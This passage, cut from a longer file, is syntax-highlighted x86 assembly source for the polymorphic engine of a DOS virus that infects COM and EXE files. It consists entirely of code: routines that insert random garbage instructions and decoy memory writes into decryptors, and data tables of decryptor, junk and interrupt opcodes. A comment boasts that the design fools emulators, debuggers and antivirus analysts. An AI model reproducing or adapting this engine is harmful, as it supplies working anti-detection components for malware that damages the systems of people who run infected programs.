        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@EsEXE</span><span class="sc0">               </span><span class="sc1">; If it's an EXE, jump and</span><span class="sc0">
                            </span><span class="sc1">; insert only a "CS:"</span><span class="sc0">
  </span><span class="sc5">@@EsCOM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">         </span><span class="sc1">; Get a random number</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">           </span><span class="sc1">; Make a "CS:", "ES:" or "SS:".</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">           </span><span class="sc1">; If a "DS:" is going to be sto-</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Sigue7</span><span class="sc0">            </span><span class="sc1">; red, it has a random 50% of</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">             </span><span class="sc1">; probability to insert it</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Sigue2</span><span class="sc0">
  </span><span class="sc5">@@Sigue7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue1</span><span class="sc0">
  </span><span class="sc5">@@EsEXE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">
  </span><span class="sc5">@@Sigue1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">                 </span><span class="sc1">; Store segment opcode</span><span class="sc0">
  </span><span class="sc5">@@Sigue2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MiraSiPrimerDes</span><span class="sc0">       </span><span class="sc1">; Check if second decryptor</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Sigue8</span><span class="sc0">            </span><span class="sc1">; If second decryptor, avoid in-</span><span class="sc0">
                          </span><span class="sc1">; dexed writes</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">RegistrosUsados</span><span class="sc4">-</span><span class="sc2">201h</span><span class="sc0"> </span><span class="sc1">; Get a non-used regis-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003</span><span class="sc0">          </span><span class="sc1">; ter (a non-modified register</span><span class="sc0">
  </span><span class="sc5">@@OtraVez2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">            </span><span class="sc1">; that mantains the initial exe-</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; cution value). If there aren't</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez</span><span class="sc0">           </span><span class="sc1">; any free, then avoid indexed</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@OtraVez2</span><span class="sc0">          </span><span class="sc1">; write and do normal</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue8</span><span class="sc0">
  </span><span class="sc5">@@OtraVez</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">         </span><span class="sc1">; Get a random number in AX be-</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">            </span><span class="sc1">; tween 1 and 3</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Convert it from 0 to 2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Put it on BX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">RegistrosUsados</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Get a random not-used</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; register from this set of</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@OtraVez</span><span class="sc0">            </span><span class="sc1">; index registers</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; Add 5 to get the number of register</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Put register in DL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">TablaIndices</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Translate it to index</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">                     </span><span class="sc1">; codification</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">     </span><span class="sc1">; Set word-adding-to-index on</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Put the opcode in CL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random number in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3839h</span><span class="sc0">   </span><span class="sc1">; Get a random register in AH, and a</span><span class="sc0">
                    </span><span class="sc1">; random operation in AL (byte or word</span><span class="sc0">
                    </span><span class="sc1">; operation randomly, too)</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">      </span><span class="sc1">; Put index in second opcode</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">      </span><span class="sc1">; Put register in BX</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Get address of initial execution va-</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">InicValoresCOM</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; lue in BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TipoEjec</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; If host is a COM, jump</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Sigue10</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010h</span><span class="sc0">   </span><span class="sc1">; Get address of EXE initial register</span><span class="sc0">
                    </span><span class="sc1">; values</span><span class="sc0">
   </span><span class="sc5">@@Sigue10</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get initial value in DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Save it onto stack</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenDireccionEscrit</span><span class="sc0"> </span><span class="sc1">; Get a write direction in AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Restore DX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Calculate adding for the index in</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; the instruction and complete it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">;; Here a normal direct-address memory write is inserted</span><span class="sc0">
  </span><span class="sc5">@@Sigue8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random operation with a random</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3839h</span><span class="sc0">   </span><span class="sc1">; 8/16 bits register</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">     </span><span class="sc1">; Set "direct address" on</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenDireccionEscrit</span><span class="sc0"> </span><span class="sc1">; Get a memory address for write</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store it for completing instruction</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">MeteEscritura</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Routine to get a secure address for writing. All got addresses points to</span><span class="sc0">
</span><span class="sc1">;; the virus body, so it would seem modifications to decrypted variables. But</span><span class="sc0">
</span><span class="sc1">;; the value of this zones doesn't affect to the virus operations once decryp-</span><span class="sc0">
</span><span class="sc1">;; ted, so it can fool emulators and debuggers. Deal with it, AVers! :)</span><span class="sc0">
</span><span class="sc5">ObtenDireccionEscrit</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
  </span><span class="sc5">@@Sigue3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">  </span><span class="sc1">; Get a random number between 0 and 16h</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0017h</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">   </span><span class="sc5">@@Sigue3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003</span><span class="sc0">   </span><span class="sc1">; Get address where data is stored</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Escritura</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get this number, which means the quantity</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">     </span><span class="sc1">; that the index can vary from the address</span><span class="sc0">
                   </span><span class="sc1">; after. For example, if there is a 0, then</span><span class="sc0">
                   </span><span class="sc1">; the address must be as-is. But if there</span><span class="sc0">
                   </span><span class="sc1">; is a 2, then the address can be from</span><span class="sc0">
                   </span><span class="sc1">; Address+0 to Address+2 randomly</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">     </span><span class="sc1">; Set high-word of division to 0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">  </span><span class="sc1">; Get a random number</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">     </span><span class="sc1">; CX=CL</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">     </span><span class="sc1">; Get a random number between 0 and CL-1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">     </span><span class="sc1">; Put the remainder (what we want) in AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add address where writing is safe</span><span class="sc0">
   </span><span class="sc5">@@Sigue5</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Calculate address inside the</span><span class="sc0">
                         </span><span class="sc1">; virus body once in the host</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">        </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">ObtenDireccionEscrit</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;; DATA SECTION</span><span class="sc0">

</span><span class="sc1">; Translation from register to index codification to make opcodes of memory</span><span class="sc0">
</span><span class="sc1">; operations</span><span class="sc0">
</span><span class="sc5">TablaIndices</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc1">;           AX CX DX BX SP BP  SI DI</span><span class="sc0">
</span><span class="sc1">; BP must have bits field (15,14) to non-zero because if not it's interpreted</span><span class="sc0">
</span><span class="sc1">; like a direct memory address operation (a number, not a register)</span><span class="sc0">

</span><span class="sc1">; Opcodes for the decryptor. They are opcodes for XOR, ADD, SUB and XOR, resp.</span><span class="sc0">
</span><span class="sc5">OpcodesCriptado</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">

</span><span class="sc1">;; Opcodes for checking the state of counter</span><span class="sc0">
</span><span class="sc1">; Check by operation: with opcode 81h/83h, they form: ADD, SUB, CMP, CMP</span><span class="sc0">
</span><span class="sc5">OpcodesComprueba</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc1">; Check by logical operation: Opcodes of the instructions: OR, AND, TEST</span><span class="sc0">
</span><span class="sc5">OpcodesLogicos</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">

</span><span class="sc1">;; Interrupt numbers that can be safely used (if there isn't a debugger :) )</span><span class="sc0">
</span><span class="sc5">OpcodesInterrup</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">1Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc1">; INT 1Ch, 28h, 01h and 03h</span><span class="sc0">

</span><span class="sc1">;; Opcodes of one-byte instructions that don't modify checking flags. They</span><span class="sc0">
</span><span class="sc1">;; are also the normal one-byte instructions</span><span class="sc0">
</span><span class="sc5">BasuraNoBanderas</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
</span><span class="sc1">;           CMC,  CLC,  STC,  STI,  CLD,  STD,  NOP, DS:</span><span class="sc0">
</span><span class="sc1">;; One-byte instructions that modify AX (NOP is to fill)</span><span class="sc0">
</span><span class="sc5">ConAX</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">37h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D7h</span><span class="sc0">
</span><span class="sc1">;           CBW, DAA, DAS, AAA, AAF, NOP, LAHF,XLAT</span><span class="sc0">

</span><span class="sc1">;; Conditional jump opcodes. First four are for decreasing counters, and next</span><span class="sc0">
</span><span class="sc1">;; four are for increasing ones.</span><span class="sc0">
</span><span class="sc5">Saltos</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Eh</span><span class="sc0">
</span><span class="sc1">;           JNZ, JNS, JGE, JG,  JNZ, JS,  JL,  JLE</span><span class="sc0">

</span><span class="sc1">;; Opcodes to use for garbage more-than-two-bytes instructions.</span><span class="sc0">
</span><span class="sc5">BasuraInstruc</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Ah</span><span class="sc0">
</span><span class="sc1">;           ADD, OR,  ADC, SBB, AND, SUB, XOR, CMP,TEST, MOV</span><span class="sc0">

</span><span class="sc1">;; Interrupt functions. They're in groups of two bytes. First byte is the</span><span class="sc0">
</span><span class="sc1">;; function to use, and next byte is the interruption to use. This functions</span><span class="sc0">
</span><span class="sc1">;; don't modify nothing but don't used registers. They can't be used, for</span><span class="sc0">
</span><span class="sc1">;; this reason, in the first decryptor, where the initial values of the regis-</span><span class="sc0">
</span><span class="sc1">;; ters are used.</span><span class="sc0">
</span><span class="sc5">FuncInterrup</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;; Safe writting fields table. This is used in "ObtenDireccionEscrit"</span><span class="sc0">
</span><span class="sc5">Escritura</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">AntInt21h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">SaltoCOM</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura5</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura6</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura7</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura8</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
